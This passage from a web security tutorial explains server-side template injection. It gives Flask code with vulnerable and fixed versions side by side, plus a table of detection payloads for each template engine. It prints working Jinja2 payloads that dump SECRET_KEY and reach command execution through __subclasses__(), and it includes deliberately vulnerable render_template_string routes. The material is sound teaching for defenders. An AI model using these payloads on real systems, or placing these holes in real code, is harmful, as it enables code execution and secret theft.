    <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># Validate and escape</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">query</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">query</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid query&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="n">safe_query</span> <span class="o">=</span> <span class="n">ldap_escape</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>

    <span class="n">server</span> <span class="o">=</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">Server</span><span class="p">(</span><span class="n">LDAP_SERVER</span><span class="p">)</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">Connection</span><span class="p">(</span><span class="n">server</span><span class="p">,</span> <span class="n">auto_bind</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

    <span class="c1"># Use escaped value in filter</span>
    <span class="n">search_filter</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;(&amp;(objectClass=person)(|(cn=*</span><span class="si">{</span><span class="n">safe_query</span><span class="si">}</span><span class="s2">*)(mail=*</span><span class="si">{</span><span class="n">safe_query</span><span class="si">}</span><span class="s2">*)))&quot;</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">LDAP_BASE_DN</span><span class="p">,</span> <span class="n">search_filter</span><span class="p">,</span> <span class="n">attributes</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;cn&#39;</span><span class="p">,</span> <span class="s1">&#39;mail&#39;</span><span class="p">])</span>

    <span class="n">results</span> <span class="o">=</span> <span class="p">[{</span><span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">cn</span><span class="p">),</span> <span class="s2">&quot;email&quot;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">mail</span><span class="p">)}</span> <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">conn</span><span class="o">.</span><span class="n">entries</span><span class="p">]</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">unbind</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;results&quot;</span><span class="p">:</span> <span class="n">results</span><span class="p">})</span>
</code></pre></div>

<hr />
<h2 id="7-server-side-template-injection-ssti">7. Server-Side Template Injection (SSTI)<a class="header-link" href="#7-server-side-template-injection-ssti" title="Permanent link">&para;</a></h2>
<h3 id="71-how-ssti-works">7.1 How SSTI Works<a class="header-link" href="#71-how-ssti-works" title="Permanent link">&para;</a></h3>
<p>SSTI occurs when user input is embedded into a template engine's template string rather than passed as data. The attacker can execute arbitrary code through template directives.</p>
<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="err">â”‚</span><span class="w">          </span><span class="n">Server</span><span class="o">-</span><span class="n">Side</span><span class="w"> </span><span class="n">Template</span><span class="w"> </span><span class="n">Injection</span><span class="w"> </span><span class="p">(</span><span class="n">SSTI</span><span class="p">)</span><span class="w">                   </span><span class="err">â”‚</span>
<span class="err">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Safe</span><span class="w"> </span><span class="p">(</span><span class="k">data</span><span class="w"> </span><span class="n">passed</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="k">parameter</span><span class="p">)</span><span class="err">:</span><span class="w">                                </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">render_template</span><span class="p">(</span><span class="ss">&quot;hello.html&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="n">user_input</span><span class="p">)</span><span class="w">                 </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nl">Template</span><span class="p">:</span><span class="w"> </span><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Hello</span><span class="w"> </span><span class="err">{{</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="err">}}</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span><span class="w">                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â†’</span><span class="w"> </span><span class="k">User</span><span class="w"> </span><span class="k">input</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">treated</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="k">data</span><span class="p">,</span><span class="w"> </span><span class="n">auto</span><span class="o">-</span><span class="n">escaped</span><span class="w">                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">VULNERABLE</span><span class="w"> </span><span class="p">(</span><span class="k">user</span><span class="w"> </span><span class="k">input</span><span class="w"> </span><span class="ow">IN</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">template</span><span class="p">)</span><span class="err">:</span><span class="w">                        </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">render_template_string</span><span class="p">(</span><span class="n">f</span><span class="ss">&quot;&lt;h1&gt;Hello {user_input}&lt;/h1&gt;&quot;</span><span class="p">)</span><span class="w">         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â†’</span><span class="w"> </span><span class="k">User</span><span class="w"> </span><span class="k">input</span><span class="w"> </span><span class="k">IS</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">template</span><span class="w"> </span><span class="n">code</span><span class="err">!</span><span class="w">                             </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Attack</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="p">(</span><span class="n">Jinja2</span><span class="p">)</span><span class="err">:</span><span class="w">                                        </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">{{</span><span class="w"> </span><span class="n">config</span><span class="p">.</span><span class="n">items</span><span class="p">()</span><span class="w"> </span><span class="err">}}</span><span class="w">                                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â†’</span><span class="w"> </span><span class="n">Dumps</span><span class="w"> </span><span class="n">application</span><span class="w"> </span><span class="n">configuration</span><span class="w"> </span><span class="p">(</span><span class="n">SECRET_KEY</span><span class="p">,</span><span class="w"> </span><span class="n">DB</span><span class="w"> </span><span class="n">URI</span><span class="p">,</span><span class="w"> </span><span class="n">etc</span><span class="p">.)</span><span class="w">   </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">{{</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="w"> </span><span class="err">}}</span><span class="w">                 </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â†’</span><span class="w"> </span><span class="n">Lists</span><span class="w"> </span><span class="ow">all</span><span class="w"> </span><span class="n">Python</span><span class="w"> </span><span class="n">classes</span><span class="w"> </span><span class="p">(</span><span class="k">path</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">RCE</span><span class="p">)</span><span class="w">                       </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">{{</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">[</span><span class="n">X</span><span class="o">]</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span><span class="w">          </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">       </span><span class="n">shell</span><span class="o">=</span><span class="k">True</span><span class="p">,</span><span class="w"> </span><span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">).</span><span class="n">communicate</span><span class="p">()</span><span class="w"> </span><span class="err">}}</span><span class="w">                    </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â†’</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="n">Code</span><span class="w"> </span><span class="n">Execution</span><span class="err">!</span><span class="w">                                       </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Template</span><span class="w"> </span><span class="n">Engines</span><span class="w"> </span><span class="nl">Affected</span><span class="p">:</span><span class="w">                                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Jinja2</span><span class="w"> </span><span class="p">(</span><span class="n">Python</span><span class="o">/</span><span class="n">Flask</span><span class="p">)</span><span class="w">                                        </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Twig</span><span class="w"> </span><span class="p">(</span><span class="n">PHP</span><span class="p">)</span><span class="w">                                                    </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Freemarker</span><span class="w"> </span><span class="p">(</span><span class="n">Java</span><span class="p">)</span><span class="w">                                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Velocity</span><span class="w"> </span><span class="p">(</span><span class="n">Java</span><span class="p">)</span><span class="w">                                               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">ERB</span><span class="w"> </span><span class="p">(</span><span class="n">Ruby</span><span class="p">)</span><span class="w">                                                    </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Smarty</span><span class="w"> </span><span class="p">(</span><span class="n">PHP</span><span class="p">)</span><span class="w">                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<h3 id="72-vulnerable-and-fixed-code">7.2 Vulnerable and Fixed Code<a class="header-link" href="#72-vulnerable-and-fixed-code" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">ssti.py - Server-Side Template Injection vulnerability and prevention</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">render_template_string</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">jinja2.sandbox</span><span class="w"> </span><span class="kn">import</span> <span class="n">SandboxedEnvironment</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;super-secret-database-key-12345&#39;</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># VULNERABLE: User input in template string</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/greet-vulnerable&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">greet_vulnerable</span><span class="p">():</span>
    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="s1">&#39;World&#39;</span><span class="p">)</span>

    <span class="c1"># VULNERABLE: User input IS part of the template</span>
    <span class="n">template</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&lt;h1&gt;Hello </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">!&lt;/h1&gt;&quot;</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>

<span class="c1"># Attack: /greet-vulnerable?name={{ config[&#39;SECRET_KEY&#39;] }}</span>
<span class="c1"># Result: &lt;h1&gt;Hello super-secret-database-key-12345!&lt;/h1&gt;</span>

<span class="c1"># Attack: /greet-vulnerable?name={{ &#39;&#39;.__class__.__mro__[1].__subclasses__() }}</span>
<span class="c1"># Result: Lists all Python classes, enabling code execution</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/profile-vulnerable&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">profile_vulnerable</span><span class="p">():</span>
    <span class="c1"># Loading user-created template from database</span>
    <span class="n">user_template</span> <span class="o">=</span> <span class="n">get_user_template</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">])</span>

    <span class="c1"># VULNERABLE: User-controlled template content</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">user_template</span><span class="p">)</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># VULNERABLE: Template in error page</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">not_found_vulnerable</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">url</span>
    <span class="c1"># VULNERABLE: URL reflected into template string</span>
    <span class="n">template</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">    &lt;html&gt;</span>
<span class="s2">    &lt;body&gt;</span>
<span class="s2">        &lt;h1&gt;Page Not Found&lt;/h1&gt;</span>
<span class="s2">        &lt;p&gt;The page </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2"> was not found.&lt;/p&gt;</span>
<span class="s2">    &lt;/body&gt;</span>
<span class="s2">    &lt;/html&gt;</span>
<span class="s2">    &quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">),</span> <span class="mi">404</span>

<span class="c1"># Attack: GET /{{config.items()}}</span>
<span class="c1"># The 404 handler renders the template with the config data</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># FIXED: Pass user input as data, not as template code</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/greet-secure&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">greet_secure</span><span class="p">():</span>
    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="s1">&#39;World&#39;</span><span class="p">)</span>

    <span class="c1"># FIXED: User input passed as data parameter</span>
    <span class="c1"># Jinja2 auto-escapes {{ name }} when it&#39;s a variable</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span>
        <span class="s2">&quot;&lt;h1&gt;Hello {{ name }}!&lt;/h1&gt;&quot;</span><span class="p">,</span>
        <span class="n">name</span><span class="o">=</span><span class="n">name</span>  <span class="c1"># This is DATA, not template code</span>
    <span class="p">)</span>

<span class="c1"># Input: {{ config[&#39;SECRET_KEY&#39;] }}</span>
<span class="c1"># Output: &lt;h1&gt;Hello {{ config[&amp;#39;SECRET_KEY&amp;#39;] }}!&lt;/h1&gt;</span>
<span class="c1"># Rendered as text, not executed!</span>


<span class="c1"># BEST: Use separate template files, not render_template_string</span>
<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/greet-best&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">greet_best</span><span class="p">():</span>
    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="s1">&#39;World&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;greet.html&#39;</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">name</span><span class="p">)</span>
    <span class="c1"># greet.html: &lt;h1&gt;Hello {{ name }}!&lt;/h1&gt;</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">not_found_secure</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
    <span class="c1"># FIXED: URL passed as data, not embedded in template</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        &lt;html&gt;</span>
<span class="sd">        &lt;body&gt;</span>
<span class="sd">            &lt;h1&gt;Page Not Found&lt;/h1&gt;</span>
<span class="sd">            &lt;p&gt;The requested page was not found.&lt;/p&gt;</span>
<span class="sd">        &lt;/body&gt;</span>
<span class="sd">        &lt;/html&gt;</span>
<span class="sd">        &quot;&quot;&quot;</span><span class="p">,</span>
    <span class="p">),</span> <span class="mi">404</span>
    <span class="c1"># Note: Don&#39;t even include the URL in the error page (information leakage)</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># If user-generated templates are required: Use Sandbox</span>
<span class="c1"># ==============================================================</span>

<span class="k">def</span><span class="w"> </span><span class="nf">render_user_template_safe</span><span class="p">(</span><span class="n">template_str</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">context</span><span class="p">:</span> <span class="nb">dict</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    Render a user-provided template in a sandboxed environment.</span>
<span class="sd">    This restricts access to dangerous attributes and methods.</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="c1"># Sandboxed environment restricts attribute access</span>
    <span class="n">sandbox</span> <span class="o">=</span> <span class="n">SandboxedEnvironment</span><span class="p">()</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">template</span> <span class="o">=</span> <span class="n">sandbox</span><span class="o">.</span><span class="n">from_string</span><span class="p">(</span><span class="n">template_str</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">template</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="o">**</span><span class="n">context</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
        <span class="k">return</span> <span class="s2">&quot;&lt;p&gt;Error rendering template&lt;/p&gt;&quot;</span>

<span class="c1"># The sandbox prevents:</span>
<span class="c1"># - Accessing __class__, __mro__, __subclasses__</span>
<span class="c1"># - Calling dangerous functions</span>
<span class="c1"># - Accessing config or other app internals</span>
<span class="c1"># But it&#39;s still not 100% safe - prefer to avoid user templates entirely</span>
</code></pre></div>

<h3 id="73-ssti-detection-cheat-sheet">7.3 SSTI Detection Cheat Sheet<a class="header-link" href="#73-ssti-detection-cheat-sheet" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="err">â”‚</span><span class="w">          </span><span class="n">SSTI</span><span class="w"> </span><span class="n">Detection</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">Template</span><span class="w"> </span><span class="n">Engine</span><span class="w">                        </span><span class="err">â”‚</span>
<span class="err">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Universal</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="n">payload</span><span class="p">:</span><span class="w"> </span><span class="o">$</span><span class="p">{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="p">}</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="p">{{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="p">}}</span><span class="w">                     </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">If</span><span class="w"> </span><span class="n">either</span><span class="w"> </span><span class="n">renders</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="s2">&quot;49&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">app</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">vulnerable</span><span class="w">               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Engine</span><span class="o">-</span><span class="n">specific</span><span class="w"> </span><span class="n">detection</span><span class="p">:</span><span class="w">                                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><span class="w">             </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”‚</span><span class="w"> </span><span class="n">Engine</span><span class="w">       </span><span class="err">â”‚</span><span class="w"> </span><span class="n">Test</span><span class="w"> </span><span class="n">Payload</span><span class="w">         </span><span class="err">â”‚</span><span class="w"> </span><span class="n">Output</span><span class="w">  </span><span class="err">â”‚</span><span class="w">              </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span><span class="w">             </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”‚</span><span class="w"> </span><span class="n">Jinja2</span><span class="w">       </span><span class="err">â”‚</span><span class="w"> </span><span class="p">{{</span><span class="mi">7</span><span class="o">*</span><span class="s1">&#39;7&#39;</span><span class="p">}}</span><span class="w">            </span><span class="err">â”‚</span><span class="w"> </span><span class="mi">7777777</span><span class="w"> </span><span class="err">â”‚</span><span class="w">              </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”‚</span><span class="w"> </span><span class="n">Twig</span><span class="w">         </span><span class="err">â”‚</span><span class="w"> </span><span class="p">{{</span><span class="mi">7</span><span class="o">*</span><span class="s1">&#39;7&#39;</span><span class="p">}}</span><span class="w">            </span><span class="err">â”‚</span><span class="w"> </span><span class="mi">49</span><span class="w">      </span><span class="err">â”‚</span><span class="w">              </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”‚</span><span class="w"> </span><span class="n">Freemarker</span><span class="w">   </span><span class="err">â”‚</span><span class="w"> </span><span class="o">$</span><span class="p">{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="p">}</span><span class="w">               </span><span class="err">â”‚</span><span class="w"> </span><span class="mi">49</span><span class="w">      </span><span class="err">â”‚</span><span class="w">              </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”‚</span><span class="w"> </span><span class="n">ERB</span><span class="w"> </span><span class="p">(</span><span class="n">Ruby</span><span class="p">)</span><span class="w">   </span><span class="err">â”‚</span><span class="w"> </span><span class="o">&lt;%=</span><span class="w"> </span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">           </span><span class="err">â”‚</span><span class="w"> </span><span class="mi">49</span><span class="w">      </span><span class="err">â”‚</span><span class="w">              </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”‚</span><span class="w"> </span><span class="n">Smarty</span><span class="w">       </span><span class="err">â”‚</span><span class="w"> </span><span class="p">{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="p">}</span><span class="w">                </span><span class="err">â”‚</span><span class="w"> </span><span class="mi">49</span><span class="w">      </span><span class="err">â”‚</span><span class="w">              </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”‚</span><span class="w"> </span><span class="n">Velocity</span><span class="w">     </span><span class="err">â”‚</span><span class="w"> </span><span class="c1">#set($x=7*7)${x}    â”‚ 49      â”‚              â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><span class="w">             </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Prevention</span><span class="w"> </span><span class="p">(</span><span class="n">all</span><span class="w"> </span><span class="n">engines</span><span class="p">):</span><span class="w">                                       </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="mf">1.</span><span class="w"> </span><span class="n">Never</span><span class="w"> </span><span class="n">put</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="n">INTO</span><span class="w"> </span><span class="n">templates</span><span class="w">                         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="mf">2.</span><span class="w"> </span><span class="n">Always</span><span class="w"> </span><span class="k">pass</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="n">AS</span><span class="w"> </span><span class="n">template</span><span class="w"> </span><span class="n">variables</span><span class="w">                </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="mf">3.</span><span class="w"> </span><span class="n">Use</span><span class="w"> </span><span class="n">sandboxed</span><span class="w"> </span><span class="n">template</span><span class="w"> </span><span class="n">environments</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">templates</span><span class="w"> </span><span class="n">needed</span><span class="err">â”‚</span>
